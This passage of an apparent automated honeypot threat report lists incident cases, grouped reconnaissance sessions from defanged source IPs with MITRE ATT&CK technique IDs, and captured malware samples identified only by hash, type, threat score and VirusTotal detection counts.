| IR-94546dc14308 | HIGH | `92.118.39[.]49` | 2026-10-25 05:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a1ddfc927a81 | HIGH | `92.118.39[.]49` | 2026-10-25 05:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-df4eca5497fc | HIGH | `196.189.236[.]67` | 2026-10-25 05:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c94c4b36bcc7 | HIGH | `92.118.39[.]49` | 2026-10-25 05:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fbb96c688b53 | HIGH | `92.118.39[.]49` | 2026-10-25 05:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bb12a80546fb | HIGH | `92.118.39[.]49` | 2026-10-25 05:51 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e3433f92ab57 | HIGH | `43.100.90[.]143` | 2026-10-25 05:53 | Y | 1 | 0 | `T1078 · T1592` |
| IR-faff96e076c0 | HIGH | `92.118.39[.]49` | 2026-10-25 05:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-da21f89d02ff | HIGH | `92.118.39[.]49` | 2026-10-25 05:55 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
_… 235 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **8** | 2026-10-25 01:32 | 2026-10-25 14:21 | 1m | 16 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-25 08:25 | 2026-10-25 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `124.107.146[.]149` | **2** | 2026-10-25 12:23 | 2026-10-25 14:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-25 03:14 | 2026-10-25 04:09 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-25 12:55 | 2026-10-25 14:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-25 09:50 | 2026-10-25 11:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-25 01:16 | 2026-10-25 02:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-25 04:20 | 2026-10-25 06:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **2** | 2026-10-25 03:57 | 2026-10-25 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.64[.]76` | 1 | 2026-10-25 01:07 | 2026-10-25 01:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.245.96[.]27` | 1 | 2026-10-25 04:22 | 2026-10-25 04:23 | 46s | 0 | `T1592` | 🟢 LOW |
| `101.33.213[.]67` | 1 | 2026-10-25 01:44 | 2026-10-25 01:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.43.1[.]215` | 1 | 2026-10-25 01:11 | 2026-10-25 01:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]62` | 1 | 2026-10-25 01:01 | 2026-10-25 01:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.233.66[.]146` | 1 | 2026-10-25 08:37 | 2026-10-25 08:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.105.48[.]59` | 1 | 2026-10-25 08:41 | 2026-10-25 08:42 | 22s | 0 | `T1592` | 🟢 LOW |
| `106.105.48[.]59` | 1 | 2026-10-25 11:16 | 2026-10-25 11:16 | 26s | 0 | `T1592` | 🟢 LOW |
| `106.12.176[.]238` | 1 | 2026-10-25 10:19 | 2026-10-25 10:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.46[.]138` | 1 | 2026-10-25 03:23 | 2026-10-25 03:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.33[.]31` | 1 | 2026-10-25 07:34 | 2026-10-25 07:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]162` | 1 | 2026-10-25 01:18 | 2026-10-25 01:18 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-10-25 12:29 | 2026-10-25 12:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-10-25 03:20 | 2026-10-25 03:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.208[.]11` | 1 | 2026-10-25 12:25 | 2026-10-25 12:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]55` | 1 | 2026-10-25 05:27 | 2026-10-25 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.25.50[.]22` | 1 | 2026-10-25 01:05 | 2026-10-25 01:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.100.111[.]111` | 1 | 2026-10-25 03:37 | 2026-10-25 03:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `119.91.70[.]165` | 1 | 2026-10-25 10:26 | 2026-10-25 10:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.93.40[.]244` | 1 | 2026-10-25 02:34 | 2026-10-25 02:34 | 16s | 0 | `T1592` | 🟢 LOW |
| `120.26.220[.]254` | 1 | 2026-10-25 01:53 | 2026-10-25 01:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.27.215[.]143` | 1 | 2026-10-25 12:29 | 2026-10-25 12:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-10-25 11:48 | 2026-10-25 11:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.57[.]133` | 1 | 2026-10-25 14:34 | 2026-10-25 14:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.168.54[.]210` | 1 | 2026-10-25 03:17 | 2026-10-25 03:17 | 23s | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]171` | 1 | 2026-10-25 03:27 | 2026-10-25 03:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.220.22[.]72` | 1 | 2026-10-25 01:03 | 2026-10-25 01:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.223.101[.]223` | 1 | 2026-10-25 01:04 | 2026-10-25 01:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.129.1[.]253` | 1 | 2026-10-25 02:42 | 2026-10-25 02:43 | 18s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-25 03:41 | 2026-10-25 03:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-25 06:39 | 2026-10-25 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-25 08:59 | 2026-10-25 08:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-25 00:55 | 2026-10-25 00:55 | 115s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-25 06:11 | 2026-10-25 06:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-25 08:21 | 2026-10-25 08:22 | 101s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-25 10:44 | 2026-10-25 10:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-25 01:03 | 2026-10-25 01:04 | 39s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-25 03:52 | 2026-10-25 03:53 | 45s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-25 14:54 | 2026-10-25 14:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-25 14:18 | 2026-10-25 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-10-25 03:18 | 2026-10-25 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.126[.]104` | 1 | 2026-10-25 11:32 | 2026-10-25 11:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.45[.]20` | 1 | 2026-10-25 08:14 | 2026-10-25 08:16 | 88s | 0 | `T1592` | 🟢 LOW |
| `14.17.59[.]195` | 1 | 2026-10-25 08:14 | 2026-10-25 08:14 | 6s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-25 02:44 | 2026-10-25 02:45 | 47s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-25 06:09 | 2026-10-25 06:09 | 47s | 0 | `T1592` | 🟢 LOW |
| `150.158.141[.]253` | 1 | 2026-10-25 01:08 | 2026-10-25 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.158.24[.]172` | 1 | 2026-10-25 01:11 | 2026-10-25 01:12 | 29s | 0 | `T1592` | 🟢 LOW |
| `159.223.32[.]100` | 1 | 2026-10-25 10:41 | 2026-10-25 10:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | 1 | 2026-10-25 13:08 | 2026-10-25 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | 1 | 2026-10-25 14:38 | 2026-10-25 14:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.11.106[.]2` | 1 | 2026-10-25 10:14 | 2026-10-25 10:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.24.130[.]73` | 1 | 2026-10-25 01:08 | 2026-10-25 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.24.200[.]106` | 1 | 2026-10-25 01:08 | 2026-10-25 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.149[.]4` | 1 | 2026-10-25 02:16 | 2026-10-25 02:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.22.46[.]114` | 1 | 2026-10-25 06:22 | 2026-10-25 06:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-25 02:55 | 2026-10-25 02:55 | 15s | 0 | `T1592` | 🟢 LOW |
| `180.168.24[.]186` | 1 | 2026-10-25 11:14 | 2026-10-25 11:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-10-25 08:07 | 2026-10-25 08:08 | 43s | 0 | `T1592` | 🟢 LOW |
| `182.121.142[.]193` | 1 | 2026-10-25 07:24 | 2026-10-25 07:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `182.43.164[.]191` | 1 | 2026-10-25 11:32 | 2026-10-25 11:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.171.61[.]2` | 1 | 2026-10-25 05:00 | 2026-10-25 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.26.102[.]232` | 1 | 2026-10-25 08:13 | 2026-10-25 08:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `187.180.70[.]140` | 1 | 2026-10-25 08:48 | 2026-10-25 08:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `188.187.56[.]170` | 1 | 2026-10-25 11:26 | 2026-10-25 11:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-25 02:18 | 2026-10-25 02:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-25 09:43 | 2026-10-25 09:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-25 14:36 | 2026-10-25 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-25 10:53 | 2026-10-25 10:53 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-25 06:06 | 2026-10-25 06:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.221.73[.]158` | 1 | 2026-10-25 09:00 | 2026-10-25 09:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.146[.]0` | 1 | 2026-10-25 14:12 | 2026-10-25 14:12 | 9s | 0 | `T1592` | 🟢 LOW |
| `201.215.182[.]22` | 1 | 2026-10-25 09:14 | 2026-10-25 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.91.153[.]182` | 1 | 2026-10-25 04:49 | 2026-10-25 04:50 | 25s | 0 | `T1592` | 🟢 LOW |
| `210.91.153[.]182` | 1 | 2026-10-25 14:46 | 2026-10-25 14:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `211.194.52[.]6` | 1 | 2026-10-25 08:51 | 2026-10-25 08:51 | 24s | 0 | `T1592` | 🟢 LOW |
| `211.199.37[.]187` | 1 | 2026-10-25 14:10 | 2026-10-25 14:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.172.156[.]251` | 1 | 2026-10-25 03:30 | 2026-10-25 03:30 | 9s | 0 | `T1592` | 🟢 LOW |
| `218.152.243[.]192` | 1 | 2026-10-25 03:07 | 2026-10-25 03:08 | 23s | 0 | `T1592` | 🟢 LOW |
| `220.120.83[.]75` | 1 | 2026-10-25 08:59 | 2026-10-25 08:59 | 19s | 0 | `T1592` | 🟢 LOW |
| `3.85.190[.]121` | 1 | 2026-10-25 01:24 | 2026-10-25 01:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]248` | 1 | 2026-10-25 05:19 | 2026-10-25 05:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.14.116[.]111` | 1 | 2026-10-25 06:22 | 2026-10-25 06:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `34.156.222[.]77` | 1 | 2026-10-25 05:40 | 2026-10-25 05:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.156.238[.]42` | 1 | 2026-10-25 02:58 | 2026-10-25 02:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.62.179[.]189` | 1 | 2026-10-25 07:15 | 2026-10-25 07:15 | 11s | 0 | `T1592` | 🟢 LOW |
| `34.78.26[.]141` | 1 | 2026-10-25 02:57 | 2026-10-25 02:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `36.137.180[.]219` | 1 | 2026-10-25 02:00 | 2026-10-25 02:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.249[.]148` | 1 | 2026-10-25 11:41 | 2026-10-25 11:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.239.132[.]158` | 1 | 2026-10-25 14:39 | 2026-10-25 14:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-10-25 10:51 | 2026-10-25 10:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.124.84[.]61` | 1 | 2026-10-25 09:03 | 2026-10-25 09:03 | 9s | 0 | `T1592` | 🟢 LOW |
| `42.194.182[.]170` | 1 | 2026-10-25 01:11 | 2026-10-25 01:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.100.90[.]143` | 1 | 2026-10-25 05:53 | 2026-10-25 05:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.111.231[.]81` | 1 | 2026-10-25 02:59 | 2026-10-25 03:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.137.10[.]64` | 1 | 2026-10-25 01:04 | 2026-10-25 01:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-25 04:08 | 2026-10-25 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-25 07:05 | 2026-10-25 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-25 13:07 | 2026-10-25 13:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.235.199[.]89` | 1 | 2026-10-25 11:28 | 2026-10-25 11:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.90[.]118` | 1 | 2026-10-25 06:44 | 2026-10-25 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-10-25 14:13 | 2026-10-25 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-10-25 01:41 | 2026-10-25 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-25 03:45 | 2026-10-25 03:45 | 1s | 0 | `T1592` | 🟢 LOW |
| `47.74.51[.]79` | 1 | 2026-10-25 01:14 | 2026-10-25 01:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-25 08:37 | 2026-10-25 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-10-25 11:38 | 2026-10-25 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.240.84[.]3` | 1 | 2026-10-25 03:13 | 2026-10-25 03:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-10-25 01:07 | 2026-10-25 01:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.72.124[.]213` | 1 | 2026-10-25 12:24 | 2026-10-25 12:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.21.181[.]38` | 1 | 2026-10-25 04:04 | 2026-10-25 04:04 | 24s | 0 | `T1592` | 🟢 LOW |
| `61.151.249[.]194` | 1 | 2026-10-25 11:22 | 2026-10-25 11:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.108.202[.]22` | 1 | 2026-10-25 06:31 | 2026-10-25 06:32 | 16s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-10-25 03:02 | 2026-10-25 03:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]92` | 1 | 2026-10-25 01:30 | 2026-10-25 01:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]108` | 1 | 2026-10-25 06:39 | 2026-10-25 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]52` | 1 | 2026-10-25 04:05 | 2026-10-25 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]200` | 1 | 2026-10-25 06:19 | 2026-10-25 06:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]165` | 1 | 2026-10-25 09:48 | 2026-10-25 09:48 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | 1 | 2026-10-25 04:09 | 2026-10-25 04:09 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | 1 | 2026-10-25 06:40 | 2026-10-25 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]78` | 1 | 2026-10-25 06:31 | 2026-10-25 06:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.235.159[.]103` | 1 | 2026-10-25 12:14 | 2026-10-25 12:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-10-25 08:21 | 2026-10-25 08:21 | 1s | 0 | `T1592` | 🟢 LOW |
| `71.65.67[.]38` | 1 | 2026-10-25 12:07 | 2026-10-25 12:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.33.238[.]214` | 1 | 2026-10-25 06:37 | 2026-10-25 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-25 01:30 | 2026-10-25 01:30 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-25 05:30 | 2026-10-25 05:30 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-25 09:28 | 2026-10-25 09:29 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-25 13:22 | 2026-10-25 13:22 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.85.49[.]63` | 1 | 2026-10-25 01:30 | 2026-10-25 01:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `79.189.129[.]106` | 1 | 2026-10-25 10:57 | 2026-10-25 10:57 | 25s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-10-25 07:54 | 2026-10-25 07:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-10-25 01:46 | 2026-10-25 01:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-25 05:58 | 2026-10-25 05:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.102.49[.]125` | 1 | 2026-10-25 11:04 | 2026-10-25 11:04 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
